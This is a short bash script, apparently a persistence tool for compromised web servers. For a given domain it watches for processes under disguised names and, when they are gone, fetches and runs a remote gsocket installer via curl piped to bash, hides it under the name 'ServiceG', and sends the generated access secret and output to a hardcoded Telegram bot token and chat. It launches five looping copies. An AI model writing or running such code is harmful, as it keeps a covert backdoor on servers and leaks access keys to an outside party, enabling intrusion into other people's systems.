#!/bin/bash

if [ -z "$1" ]; then
  echo "Usage: $0 <domain>"
  exit 1
fi

TOKEN="6598877714:AAFGR7OVC1YchGkhP8WrVinz4wwLAyVMSh8"
CHAT_ID="-1002152193505"
domain="$1"

send_to_telegram() {
  local message="$1"
  curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
    -d chat_id="${CHAT_ID}" \
    -d text="${message}" \
    -d parse_mode="Markdown"
  rm -f nohup.out
}

monitor_and_restart() {
  GS_HIDDEN_NAME="ServiceG"
  
  while true; do
    if ! pgrep "ServiceG" > /dev/null && ! pgrep "defunct" > /dev/null && ! pgrep "gs-dbus" > /dev/null; then
      RANDOM_KEY=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 10)
      X_KEY="ExampleSecretChangeMe${RANDOM_KEY}"
      output=$(GS_HIDDEN_NAME="$GS_HIDDEN_NAME" X="$X_KEY" bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1)
      sleep 15
      send_to_telegram "Website $domain telah di-install ulang dengan GS_HIDDEN_NAME=$GS_HIDDEN_NAME dan X=$X_KEY, output:\n\`\`\`${output}\`\`\`"
    fi

    sleep 5
  done
}

for i in {1..5}; do
  monitor_and_restart &
done
wait
